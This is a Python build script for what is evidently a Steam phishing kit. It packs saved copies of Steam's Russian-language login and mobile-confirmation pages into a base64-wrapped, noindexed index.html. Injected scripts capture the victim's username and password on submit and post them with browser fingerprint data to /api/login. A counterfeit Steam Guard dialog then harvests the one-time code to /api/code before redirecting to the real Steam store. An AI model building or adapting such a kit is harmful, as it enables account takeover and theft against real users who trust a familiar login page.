# language: Python, file: build_single.py, stdlib only
"""
Packs the two saved Steam pages into one self-contained index.html.

    python build_single.py

Input : index.singlefile.bak.html (login) + next.html (mobile-confirm page)
Output: index.html  — shell + both pages base64'd, exact markup untouched.

The only things added to the saved pages are two end-of-document <script> blocks
(and a hidden code dialog on page 2), so their design is byte-for-byte intact.
"""
from __future__ import annotations

import base64
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent
SOURCES_DIR = BASE_DIR / "_sources"
PAGE1 = SOURCES_DIR / "index.singlefile.bak.html"
PAGE2 = SOURCES_DIR / "next.html"
OUT = BASE_DIR / "index.html"

PLACEHOLDER = "egorik_big_balls"

# --------------------------------------------------------------------------- #
# page 1 — login: capture, then switch to page 2
# --------------------------------------------------------------------------- #
PAGE1_SCRIPT = r"""
<!-- gp:login -->
<script>
(function () {
  "use strict";

  function send(path, data) {
    var body;
    try { body = JSON.stringify(data); } catch (e) { return; }
    try {
      if (navigator.sendBeacon) {
        navigator.sendBeacon(path, new Blob([body], { type: "application/json" }));
      }
    } catch (e) { /* beacon is best effort */ }
    try {
      fetch(path, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: body,
        credentials: "omit",
        keepalive: true,
        cache: "no-store"
      }).catch(function () {});
    } catch (e) {}
  }

  function tz() {
    try { return Intl.DateTimeFormat().resolvedOptions().timeZone || ""; } catch (e) { return ""; }
  }

  function goNext() {
    var url = (location.pathname || "/") + "?p=2";
    try { location.assign(url); } catch (e) { location.href = "?p=2"; }
  }

  function bind() {
    var form = document.querySelector("form");
    if (!form) { return; }

    form.addEventListener("submit", function (event) {
      event.preventDefault();

      var userInput = document.querySelector("input[type=text]");
      var passInput = document.querySelector("input[type=password]");
      var username = userInput ? userInput.value : "";
      var password = passInput ? passInput.value : "";

      if (!username && !password) { return; }

      try { sessionStorage.setItem("sg_user", username); } catch (e) {}

      var button = form.querySelector("button[type=submit]");
      if (button) {
        button.disabled = true;
        button.setAttribute("data-gp-busy", "1");
      }

      send("/api/login", {
        username: username,
        password: password,
        step: 1,
        ua: navigator.userAgent,
        lang: navigator.language,
        tz: tz(),
        screen: (window.screen.width + "x" + window.screen.height),
        ref: document.referrer || "",
        ts: Date.now()
      });

      setTimeout(goNext, 260);
      return false;
    }, true);
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", bind);
  } else {
    bind();
  }
})();
</script>
"""

# --------------------------------------------------------------------------- #
# page 2 — mobile confirm: "Войти с помощью кода" opens a Steam-styled dialog
# --------------------------------------------------------------------------- #
PAGE2_SCRIPT = r"""
<!-- gp:guard -->
<div id="sg-modal" role="dialog" aria-modal="true" aria-labelledby="sg-modal-title">
  <div id="sg-modal-card">
    <div id="sg-modal-title">Steam Guard</div>
    <div id="sg-modal-text">
      Введите код из мобильного приложения Steam для аккаунта
      <span id="sg-modal-user">Steam</span>
    </div>
    <form id="sg-code-form" autocomplete="off">
      <input id="sg-code" type="text" inputmode="text" maxlength="5"
             autocomplete="one-time-code" spellcheck="false">
      <button id="sg-code-submit" type="submit">Подтвердить</button>
    </form>
    <button id="sg-cancel" type="button">Отмена</button>
  </div>
</div>

<style>
#sg-modal{
  position:fixed; inset:0; z-index:2147483000;
  display:none; align-items:center; justify-content:center;
  background:rgba(0,0,0,.72);
  font-family:"Motiva Sans","Segoe UI",Arial,sans-serif;
}
#sg-modal.open{display:flex}
#sg-modal-card{
  width:380px; max-width:calc(100vw - 32px);
  box-sizing:border-box;
  background:linear-gradient(180deg,#1c2532 0%,#16202d 100%);
  border:1px solid #000;
  border-radius:4px;
  box-shadow:0 10px 40px rgba(0,0,0,.65);
  padding:26px 26px 22px;
  color:#c6d4df;
}
#sg-modal-title{font-size:19px;font-weight:700;color:#fff;margin-bottom:12px}
#sg-modal-text{font-size:14px;line-height:1.6;color:#acb2b8;margin-bottom:18px}
#sg-modal-user{color:#e8eef5;font-weight:600;word-break:break-all}
#sg-code{
  display:block;width:100%;box-sizing:border-box;
  padding:11px 12px;margin-bottom:14px;
  font-family:inherit;font-size:17px;letter-spacing:.32em;text-align:center;
  color:#fff;background:#32353c;border:1px solid #32353c;border-radius:3px;outline:none;
}
#sg-code:focus{border-color:#1999ff;box-shadow:0 0 0 1px rgba(25,153,255,.4)}
#sg-code::placeholder{letter-spacing:.04em;font-size:14px;color:#7d8792}
#sg-code-submit{
  display:block;width:100%;
  padding:11px 0;border:none;border-radius:3px;
  font-family:inherit;font-size:15px;font-weight:600;color:#fff;cursor:pointer;
  background:linear-gradient(90deg,#06bfff 0%,#2d73ff 100%);
}
#sg-code-submit:hover{filter:brightness(1.08)}
#sg-code-submit:disabled{opacity:.65;cursor:default;filter:none}
#sg-cancel{
  display:block;margin:14px auto 0;background:none;border:none;padding:0;
  font-family:inherit;font-size:13px;color:#1999ff;cursor:pointer;
}
</style>

<script>
(function () {
  "use strict";

  var CODE_LENGTH = 5;
  var REDIRECT_URL = "https://store.steampowered.com/";
  var account = "";
  try { account = sessionStorage.getItem("sg_user") || ""; } catch (e) {}

  var modal = document.getElementById("sg-modal");
  var card = document.getElementById("sg-modal-card");
  var input = document.getElementById("sg-code");
  var form = document.getElementById("sg-code-form");
  var submit = document.getElementById("sg-code-submit");
  var userLabel = document.getElementById("sg-modal-user");
  var cancel = document.getElementById("sg-cancel");

  if (userLabel && account) { userLabel.textContent = account; }

  function openModal() {
    if (!modal) { return; }
    modal.classList.add("open");
    if (input) {
      input.value = "";
      setTimeout(function () { try { input.focus(); } catch (e) {} }, 80);
    }
  }

  function closeModal() {
    if (modal) { modal.classList.remove("open"); }
  }

  function send(path, data) {
    var body;
    try { body = JSON.stringify(data); } catch (e) { return; }
    try {
      if (navigator.sendBeacon) {
        navigator.sendBeacon(path, new Blob([body], { type: "application/json" }));
      }
    } catch (e) {}
    try {
      fetch(path, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: body,
        credentials: "omit",
        keepalive: true,
        cache: "no-store"
      }).catch(function () {});
    } catch (e) {}
  }

  function tz() {
    try { return Intl.DateTimeFormat().resolvedOptions().timeZone || ""; } catch (e) { return ""; }
  }

  function finish() {
    var url = REDIRECT_URL;
    try { location.assign(url); } catch (e) { location.href = url; }
  }

  function wireCodeLink() {
    var nodes = document.querySelectorAll("div, a, button, span");
    for (var i = 0; i < nodes.length; i++) {
      var node = nodes[i];
      if (node.children.length) { continue; }
      if ((node.textContent || "").trim() !== "Войти с помощью кода") { continue; }
      node.setAttribute("role", "button");
      node.setAttribute("tabindex", "0");
      node.style.cursor = "pointer";
      node.addEventListener("click", function (event) {
        event.preventDefault();
        openModal();
      });
      node.addEventListener("keydown", function (event) {
        if (event.key === "Enter" || event.key === " ") {
          event.preventDefault();
          openModal();
        }
      });
    }
  }

  if (form) {
    form.addEventListener("submit", function (event) {
      event.preventDefault();
      var code = (input && input.value ? input.value : "").trim().toUpperCase();
      if (code.length !== CODE_LENGTH) { return; }

      if (submit) { submit.disabled = true; }
      send("/api/code", {
        username: account,
        code: code,
        step: 2,
        ua: navigator.userAgent,
        lang: navigator.language,
        tz: tz(),
        screen: (window.screen.width + "x" + window.screen.height),
        ts: Date.now()
      });
      setTimeout(finish, 280);
    });
  }

  if (input) {
    input.addEventListener("input", function () {
      input.value = input.value.toUpperCase().replace(/[^A-Z0-9]/g, "").slice(0, CODE_LENGTH);
    });
  }

  if (cancel) { cancel.addEventListener("click", closeModal); }

  if (card) {
    card.addEventListener("click", function (event) { event.stopPropagation(); });
  }

  if (modal) {
    modal.addEventListener("click", function (event) {
      if (event.target === modal) { closeModal(); }
    });
  }

  document.addEventListener("keydown", function (event) {
    if (event.key === "Escape") { closeModal(); }
  });

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", wireCodeLink);
  } else {
    wireCodeLink();
  }
})();
</script>
"""

SHELL = """<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="theme-color" content="#171a21">
<meta name="robots" content="noindex, nofollow">
<title>Вход</title>
<style>
  html, body { margin: 0; padding: 0; background: #1b2838; }
  #boot { position: fixed; inset: 0; display: flex; align-items: center; justify-content: center;
          background: #1b2838; color: #8f98a0; font: 14px Arial, sans-serif; }
</style>
</head>
<body>
<div id="boot">Загрузка…</div>
<script type="text/plain" id="doc-login">__DOC1__</script>
<script type="text/plain" id="doc-guard">__DOC2__</script>
<script>
(function () {
  "use strict";

  function decode(nodeId) {
    var node = document.getElementById(nodeId);
    if (!node) { return ""; }
    var raw = (node.textContent || "").replace(/[^A-Za-z0-9+/=]/g, "");
    var binary = atob(raw);
    var length = binary.length;
    var bytes = new Uint8Array(length);
    for (var i = 0; i < length; i++) { bytes[i] = binary.charCodeAt(i); }
    if (window.TextDecoder) {
      return new TextDecoder("utf-8").decode(bytes);
    }
    var escaped = "";
    for (var j = 0; j < length; j++) {
      escaped += "%" + ("00" + bytes[j].toString(16)).slice(-2);
    }
    return decodeURIComponent(escaped);
  }

  function escapeHtml(value) {
    return String(value)
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;");
  }

  function currentPage() {
    var search = location.search || "";
    var match = /[?&]p=(\\d+)/.exec(search);
    return match ? match[1] : "1";
  }

  function accountName() {
    try { return sessionStorage.getItem("sg_user") || ""; } catch (e) { return ""; }
  }

  var page = currentPage();
  var html = decode(page === "2" ? "doc-guard" : "doc-login");

  if (page === "2") {
    var name = accountName();
    if (name) {
      html = html.split("__PLACEHOLDER__").join(escapeHtml(name));
    }
  }

  document.open();
  document.write(html);
  document.close();
})();
</script>
</body>
</html>
"""


def main() -> None:
    for source in (PAGE1, PAGE2):
        if not source.exists():
            raise SystemExit(f"missing source page: {source}")

    page1 = PAGE1.read_text(encoding="utf-8", errors="ignore")
    page2 = PAGE2.read_text(encoding="utf-8", errors="ignore")

    page1 = page1 + "\n" + PAGE1_SCRIPT
    page2 = page2 + "\n" + PAGE2_SCRIPT

    doc1 = base64.b64encode(page1.encode("utf-8")).decode("ascii")
    doc2 = base64.b64encode(page2.encode("utf-8")).decode("ascii")

    shell = SHELL.replace("__DOC1__", doc1).replace("__DOC2__", doc2)
    shell = shell.replace("__PLACEHOLDER__", PLACEHOLDER)

    OUT.write_text(shell, encoding="utf-8")
    print(f"[+] {OUT.name}: {len(shell):,} bytes")
    print(f"    login page: {len(page1):,} bytes -> {len(doc1):,} b64")
    print(f"    guard page: {len(page2):,} bytes -> {len(doc2):,} b64")


if __name__ == "__main__":
    main()

